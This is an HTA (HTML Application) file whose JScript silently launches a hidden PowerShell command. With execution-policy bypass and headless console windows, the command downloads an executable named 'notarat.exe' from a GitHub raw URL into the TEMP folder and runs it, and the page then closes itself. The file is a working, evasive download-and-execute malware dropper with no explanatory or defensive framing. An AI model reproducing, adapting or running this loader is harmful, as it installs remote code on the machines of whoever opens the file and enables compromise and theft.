<html>
<head>
<HTA:APPLICATION>
<script language="jscript">
var url = "https://raw.githubusercontent.com/sinnaiah/a/refs/heads/main/notarat.exe";
var filename = "notarat.exe";
var command = "conhost.exe --headless cmd.exe /c powershell.exe -w h -ep bypass -c \"$t=Join-Path $env:TEMP '" + filename + "';Invoke-WebRequest -Uri '" + url + "' -OutFile $t -UseBasicParsing;if(Test-Path $t){& conhost.exe --headless cmd.exe /c $t}\"";

new ActiveXObject("WScript.Shell").Run(command, 0, false);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
